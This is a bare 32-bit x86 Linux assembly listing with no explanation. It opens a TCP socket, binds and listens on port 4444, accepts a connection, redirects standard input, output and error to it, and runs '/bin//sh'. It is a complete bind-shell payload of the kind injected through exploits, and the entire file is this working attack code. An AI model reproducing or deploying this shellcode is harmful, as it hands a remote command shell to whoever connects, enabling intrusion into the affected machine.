section .text
    global _start
 
_start:
 
        xor eax, eax
        xor ebx, ebx 
        mov al, 0x66
        mov bl, 0x1
        push 0x0 
        push 0x1    
        push 0x2    
        mov ecx, esp  
        int 0x80     
        
        mov esi, eax    
        xor eax, eax  
        xor edx, edx    
        mov al, 0x66   
        inc bl     
        push edx  
        push word 0x5c11    
        push word 0x2             
        mov ecx, esp      
        push byte 0x10     
        push ecx         
        push esi       
        mov ecx, esp      
        int 0x80     
        
        mov al, 0x66      
        mov bl, 0x4       
        mov edx, 0x0        
        int 0x80         
        
    xor ecx, ecx     
        mov al, 0x66  
        inc bl       
        push edx      
        push edx      
        push esi        
        mov ecx, esp     
        int 0x80        
        

        xchg ebx, eax     
        xor ecx, ecx       
        mov esi, eax
        mov al, 0x3f
        mov cl, 0x2   
        int 0x80 
        mov al, 0x3f   
        mov cl, 0x1     
        int 0x80         
        mov cl, 0x0           
        int 0x80      
        
    xor eax, eax 
        push eax     
        push 0x68732f2f    
        push 0x6e69622f
        mov ebx, esp            
        mov al, 0xb     
        int 0x80